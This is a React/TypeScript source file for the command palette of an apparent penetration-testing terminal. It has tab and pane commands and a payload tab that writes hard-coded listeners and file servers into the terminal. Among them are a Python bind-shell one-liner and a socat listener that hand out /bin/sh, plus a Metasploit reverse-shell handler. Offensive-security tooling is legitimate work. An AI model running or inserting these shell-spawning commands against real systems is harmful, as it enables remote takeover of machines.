import { useState, useRef, useEffect, useMemo, useCallback } from 'react';
import { useTerminalStore, type PayloadEncodeMode, type PaletteTab } from '../store/terminal';
import { PAYLOADS, WORDLISTS, type Payload } from './PayloadPalette';

const LISTENERS = [
  { id: 'nc', label: 'nc -lvnp {LPORT}', content: 'rlwrap nc -lvnp {LPORT}' },
  { id: 'python', label: 'Python listener', content: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);c,addr=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
  { id: 'socat', label: 'Socat listener', content: 'socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid' },
  { id: 'ncat-ssl', label: 'Ncat SSL listener', content: 'ncat -lvnp {LPORT} --ssl' },
  { id: 'pwncat', label: 'Pwncat listener', content: 'pwncat-cs -lp {LPORT}' },
  { id: 'msf-handler', label: 'Metasploit handler', content: `msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/shell_reverse_tcp;set LHOST {LHOST};set LPORT {LPORT};run"` },
];

const SERVE_CMDS = [
  { id: 'http-py', label: 'HTTP server (python3)', content: "python3 -m http.server {LPORT:-8080}" },
  { id: 'http-php', label: 'HTTP server (php)', content: 'php -S 0.0.0.0:{LPORT:-8080}' },
  { id: 'http-rb', label: 'HTTP server (ruby)', content: 'ruby -run -ehttpd . -p{LPORT:-8080}' },
  { id: 'smb-py', label: 'SMB server (impacket)', content: "smbserver.py -smb2support share ." },
  { id: 'tftp-py', label: 'TFTP server', content: 'python3 -m pyftpdlib -p {LPORT:-69}' },
  { id: 'updog', label: 'Updog (HTTPS)', content: 'updog -p {LPORT:-9090}' },
];

function substituteVars(s: string, lhost: string, lport: string, target: string): string {
  return s
    .replace(/\{LHOST\}/g, lhost || '127.0.0.1')
    .replace(/\{LPORT\}/g, lport || '4444')
    .replace(/\{TARGET\}/g, target || 'example.com');
}

export function CommandPalette() {
  const commandPaletteOpen = useTerminalStore((s) => s.commandPaletteOpen);
  const toggleCommandPalette = useTerminalStore((s) => s.toggleCommandPalette);
  const commandPaletteInitialTab = useTerminalStore((s) => s.commandPaletteInitialTab);
  const addTab = useTerminalStore((s) => s.addTab);
  const closeTab = useTerminalStore((s) => s.closeTab);
  const activeTabId = useTerminalStore((s) => s.activeTabId);
  const toggleSettings = useTerminalStore((s) => s.toggleSettings);
  const toggleRecon = useTerminalStore((s) => s.toggleRecon);
  const splitPane = useTerminalStore((s) => s.splitPane);
  const activePaneId = useTerminalStore((s) => s.activePaneId);
  const tabs = useTerminalStore((s) => s.tabs);
  const payloadEncodeMode = useTerminalStore((s) => s.payloadEncodeMode);
  const setPayloadEncodeMode = useTerminalStore((s) => s.setPayloadEncodeMode);
  const writeToActiveTerminal = useTerminalStore((s) => s.writeToActiveTerminal);
  const lhost = useTerminalStore((s) => s.lhost);
  const lport = useTerminalStore((s) => s.lport);
  const target = useTerminalStore((s) => s.target);
  const setLhost = useTerminalStore((s) => s.setLhost);
  const setLport = useTerminalStore((s) => s.setLport);
  const setTarget = useTerminalStore((s) => s.setTarget);

  const [tab, setTab] = useState<PaletteTab>(commandPaletteInitialTab);
  const [query, setQuery] = useState('');
  const [selectedIndex, setSelectedIndex] = useState(0);
  const [customPath, setCustomPath] = useState('');
  const inputRef = useRef<HTMLInputElement>(null);

  const commands: { id: string; label: string; shortcut?: string; action: () => void; category?: string }[] = useMemo(
    () => [
      { id: 'new-tab', label: 'New Tab', shortcut: 'Ctrl+Shift+T', action: () => { addTab(); toggleCommandPalette(); }, category: 'Tabs' },
      { id: 'close-tab', label: 'Close Tab', shortcut: 'Ctrl+Shift+W', action: () => { closeTab(activeTabId); toggleCommandPalette(); }, category: 'Tabs' },
      { id: 'split-h', label: 'Split Horizontally', shortcut: 'Ctrl+Shift+O', action: () => { splitPane(activePaneId, 'horizontal'); toggleCommandPalette(); }, category: 'Panes' },
      { id: 'split-v', label: 'Split Vertically', shortcut: 'Ctrl+Shift+E', action: () => { splitPane(activePaneId, 'vertical'); toggleCommandPalette(); }, category: 'Panes' },
      { id: 'settings', label: 'Open Settings', shortcut: 'Ctrl+Shift+,', action: () => { toggleSettings(); toggleCommandPalette(); }, category: 'Settings' },
      { id: 'recon', label: 'Toggle Security Recon', action: () => { toggleRecon(); toggleCommandPalette(); }, category: 'Recon' },
      { id: 'handler', label: 'Toggle Reverse Shell Handler', action: () => { useTerminalStore.getState().toggleHandler(); toggleCommandPalette(); }, category: 'Handler' },
      { id: 'search', label: 'Search in Scrollback', shortcut: 'Ctrl+Shift+F', action: () => { toggleCommandPalette(); useTerminalStore.getState().toggleSearch(); }, category: 'Search' },
      { id: 'zoom-in', label: 'Zoom In', shortcut: 'Ctrl++', action: () => { useTerminalStore.getState().zoomIn(); toggleCommandPalette(); }, category: 'View' },
      { id: 'zoom-out', label: 'Zoom Out', shortcut: 'Ctrl+-', action: () => { useTerminalStore.getState().zoomOut(); toggleCommandPalette(); }, category: 'View' },
      { id: 'zoom-reset', label: 'Reset Zoom', shortcut: 'Ctrl+0', action: () => { useTerminalStore.getState().zoomReset(); toggleCommandPalette(); }, category: 'View' },
      ...tabs.map((tab) => ({
        id: `goto-${tab.id}`,
        label: `Go to ${tab.title}`,
        action: () => {
          useTerminalStore.getState().setActiveTab(tab.id);
          toggleCommandPalette();
        },
        category: 'Navigate',
      })),
    ],
    [addTab, closeTab, activeTabId, toggleSettings, toggleRecon, splitPane, activePaneId, tabs, toggleCommandPalette]
  );

  const filteredPayloads = useMemo(() => {
    if (!query) return PAYLOADS;
    const q = query.toLowerCase();
    return PAYLOADS.filter(
      (p) =>
        p.name.toLowerCase().includes(q) ||
        p.category.toLowerCase().includes(q) ||
        p.content.toLowerCase().includes(q)
    );
  }, [query]);

  const filteredWordlists = useMemo(() => {
    if (!query) return WORDLISTS;
    const q = query.toLowerCase();
    return WORDLISTS.filter((w) => w.name.toLowerCase().includes(q) || w.path.toLowerCase().includes(q));
  }, [query]);

  const filteredCommands = useMemo(
    () =>
      commands.filter((cmd) =>
        cmd.label.toLowerCase().includes(query.toLowerCase()) ||
        (cmd.category && cmd.category.toLowerCase().includes(query.toLowerCase()))
      ),
    [commands, query]
  );

  const allItems = useMemo(() => {
    if (tab === 'commands') return filteredCommands;
    const items: { id: string; label: string; action: () => void }[] = [];
    const ql = query.toLowerCase();
    const showListeners = query === '' || ql.includes('listen') || ql.includes('nc') || ql.includes('handler');
    const showServe = query === '' || ql.includes('serve') || ql.includes('http') || ql.includes('server');
    if (showListeners) {
      for (const l of LISTENERS) {
        items.push({
          id: l.id,
          label: `[Listener] ${l.label}`,
          action: () => { writeSubstituted(l.content); toggleCommandPalette(); },
        });
      }
    }
    if (showServe) {
      for (const s of SERVE_CMDS) {
        items.push({
          id: s.id,
          label: `[Serve] ${s.label}`,
          action: () => { writeSubstituted(s.content); toggleCommandPalette(); },
        });
      }
    }
    for (const p of filteredPayloads) {
      items.push({
        id: p.id,
        label: `${p.name} — ${p.category}`,
        action: () => {
          handlePayloadClick(p);
        },
      });
    }
    for (const w of filteredWordlists) {
      items.push({
        id: w.id,
        label: `${w.name} (${w.path})`,
        action: () => {
          writeToActiveTerminal(w.path + '\n');
          toggleCommandPalette();
        },
      });
    }
    return items;
  }, [tab, filteredCommands, filteredPayloads, filteredWordlists, query, writeToActiveTerminal, toggleCommandPalette]);

  useEffect(() => {
    if (commandPaletteOpen && inputRef.current) {
      inputRef.current.focus();
      setQuery('');
      setSelectedIndex(0);
    }
  }, [commandPaletteOpen]);

  useEffect(() => {
    setSelectedIndex(0);
  }, [query, tab]);

  const handleKeyDown = (e: React.KeyboardEvent) => {
    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault();
        setSelectedIndex((i) => Math.min(i + 1, allItems.length - 1));
        break;
      case 'ArrowUp':
        e.preventDefault();
        setSelectedIndex((i) => Math.max(i - 1, 0));
        break;
      case 'Enter':
        e.preventDefault();
        if (allItems[selectedIndex]) {
          allItems[selectedIndex].action();
        }
        break;
      case 'Escape':
        e.preventDefault();
        toggleCommandPalette();
        break;
    }
  };

  const handleTabSwitch = (newTab: PaletteTab) => {
    setTab(newTab);
    setQuery('');
    setSelectedIndex(0);
    inputRef.current?.focus();
  };

  const writeSubstituted = useCallback((content: string, appendNewline = true) => {
    writeToActiveTerminal(substituteVars(content, lhost, lport, target) + (appendNewline ? '\n' : ''));
  }, [writeToActiveTerminal, lhost, lport, target]);

  const handlePayloadClick = (payload: Payload) => {
    writeSubstituted(payload.content);
    toggleCommandPalette();
  };

  const handleWordlistClick = (path: string) => {
    writeToActiveTerminal(path + '\n');
    toggleCommandPalette();
  };

  const handleListenerClick = (cmd: string) => {
    writeSubstituted(cmd);
    toggleCommandPalette();
  };

  const encodeModes: { mode: PayloadEncodeMode; label: string }[] = [
    { mode: 'none', label: 'Raw' },
    { mode: 'base64', label: 'Base64' },
    { mode: 'url', label: 'URL' },
  ];

  if (!commandPaletteOpen) return null;

  return (
    <div className="command-palette-overlay" onClick={toggleCommandPalette}>
      <div className="command-palette" onClick={(e) => e.stopPropagation()}>
        <div className="cp-tabs">
          <button
            className={`cp-tab ${tab === 'commands' ? 'active' : ''}`}
            onClick={() => handleTabSwitch('commands')}
          >
            Commands
          </button>
          <button
            className={`cp-tab ${tab === 'payloads' ? 'active' : ''}`}
            onClick={() => handleTabSwitch('payloads')}
          >
            Payloads
          </button>
        </div>

        <input
          ref={inputRef}
          className="command-palette-input"
          type="text"
          placeholder={tab === 'commands' ? 'Type a command or search...' : 'Search payloads and wordlists...'}
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          onKeyDown={handleKeyDown}
        />

        {tab === 'payloads' && (
          <div className="cp-encode-row">
            <span className="cp-encode-label">On paste:</span>
            {encodeModes.map(({ mode, label }) => (
              <button
                key={mode}
                className={`cp-encode-btn ${payloadEncodeMode === mode ? 'active' : ''}`}
                onClick={() => setPayloadEncodeMode(mode)}
              >
                {label}
              </button>
            ))}
          </div>
        )}

        <div className="command-palette-list">
          {tab === 'commands' && (
            filteredCommands.length === 0 ? (
              <div className="command-item">
                <span className="command-item-label" style={{ opacity: 0.5 }}>No matching commands</span>
              </div>
            ) : (
              filteredCommands.map((cmd, index) => (
                <div
                  key={cmd.id}
                  className={`command-item ${index === selectedIndex ? 'selected' : ''}`}
                  onClick={cmd.action}
                  onMouseEnter={() => setSelectedIndex(index)}
                >
                  <span className="command-item-label">{cmd.label}</span>
                  {cmd.shortcut && (
                    <span className="command-item-shortcut">
                      {cmd.shortcut.split('+').map((key, i) => (
                        <kbd key={i}>{key}</kbd>
                      ))}
                    </span>
                  )}
                  {cmd.category && <span className="command-item-category">{cmd.category}</span>}
                </div>
              ))
            )
          )}

          {tab === 'payloads' && (
            <>
              <div className="cp-vars-row">
                <input
                  className="cp-var-input"
                  placeholder="LHOST"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  onClick={(e) => e.stopPropagation()}
                />
                <input
                  className="cp-var-input"
                  placeholder="LPORT"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  onClick={(e) => e.stopPropagation()}
                />
                <input
                  className="cp-var-input"
                  placeholder="TARGET"
                  value={target}
                  onChange={(e) => setTarget(e.target.value)}
                  onClick={(e) => e.stopPropagation()}
                />
              </div>

              {(query === '' || query.toLowerCase().includes('listen') || query.toLowerCase().includes('nc') || query.toLowerCase().includes('handler')) && (
                <div className="cp-section">
                  <div className="cp-section-title">Listeners</div>
                  {LISTENERS.map((l, i) => (
                    <div
                      key={l.id}
                      className={`command-item ${i === selectedIndex ? 'selected' : ''}`}
                      onClick={() => handleListenerClick(l.content)}
                      onMouseEnter={() => setSelectedIndex(i)}
                    >
                      <span className="command-item-label">{l.label}</span>
                      <code className="cp-wordlist-path">{l.content}</code>
                    </div>
                  ))}
                </div>
              )}

              {(query === '' || query.toLowerCase().includes('serve') || query.toLowerCase().includes('http') || query.toLowerCase().includes('server')) && (
                <div className="cp-section">
                  <div className="cp-section-title">Serve</div>
                  {SERVE_CMDS.map((s, i) => (
                    <div
                      key={s.id}
                      className={`command-item ${i === selectedIndex ? 'selected' : ''}`}
                      onClick={() => handleListenerClick(s.content)}
                      onMouseEnter={() => setSelectedIndex(i)}
                    >
                      <span className="command-item-label">{s.label}</span>
                      <code className="cp-wordlist-path">{s.content}</code>
                    </div>
                  ))}
                </div>
              )}

              <div className="cp-section">
                <div className="cp-section-title">Wordlists</div>

                <div className="cp-custom-path-row">
                  <input
                    className="cp-custom-path-input"
                    type="text"
                    placeholder="/path/to/your/wordlist.txt"
                    value={customPath}
                    onChange={(e) => setCustomPath(e.target.value)}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && customPath.trim()) {
                        writeToActiveTerminal(customPath.trim() + '\n');
                        toggleCommandPalette();
                      }
                    }}
                    onClick={(e) => e.stopPropagation()}
                  />
                  <button
                    className="cp-custom-path-go"
                    onClick={() => {
                      if (customPath.trim()) {
                        writeToActiveTerminal(customPath.trim() + '\n');
                        toggleCommandPalette();
                      }
                    }}
                    title="Insert path"
                  >
                    &rarr;
                  </button>
                </div>

                {filteredWordlists.length > 0 && (
                  <>
                    {filteredWordlists.map((w, i) => (
                      <div
                        key={w.id}
                        className={`command-item ${i === selectedIndex ? 'selected' : ''}`}
                        onClick={() => handleWordlistClick(w.path)}
                        onMouseEnter={() => setSelectedIndex(i)}
                      >
                        <span className="command-item-label">{w.name}</span>
                        <code className="cp-wordlist-path">{w.path}</code>
                      </div>
                    ))}
                  </>
                )}
              </div>

              {filteredPayloads.length === 0 && filteredWordlists.length === 0 && query !== '' && !query.toLowerCase().includes('listen') && !query.toLowerCase().includes('serve') ? (
                <div className="command-item">
                  <span className="command-item-label" style={{ opacity: 0.5 }}>No matching payloads</span>
                </div>
              ) : (
                filteredPayloads.length > 0 && (
                  <div className="cp-section">
                    <div className="cp-section-title">Payloads</div>
                    {filteredPayloads.map((payload, i) => (
                      <div
                        key={payload.id}
                        className={`payload-item ${i === selectedIndex ? 'selected' : ''}`}
                        onClick={() => handlePayloadClick(payload)}
                        onMouseEnter={() => setSelectedIndex(i)}
                      >
                        <div className="payload-item-header">
                          <span className="payload-name">{payload.name}</span>
                          <span className="payload-category">{payload.category}</span>
                        </div>
                        {payload.description && <div className="payload-desc">{payload.description}</div>}
                        <code className="payload-preview">
                          {substituteVars(payload.content, lhost, lport, target).slice(0, 80)}
                          {payload.content.length > 80 ? '...' : ''}
                        </code>
                      </div>
                    ))}
                  </div>
                )
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}

export default CommandPalette;
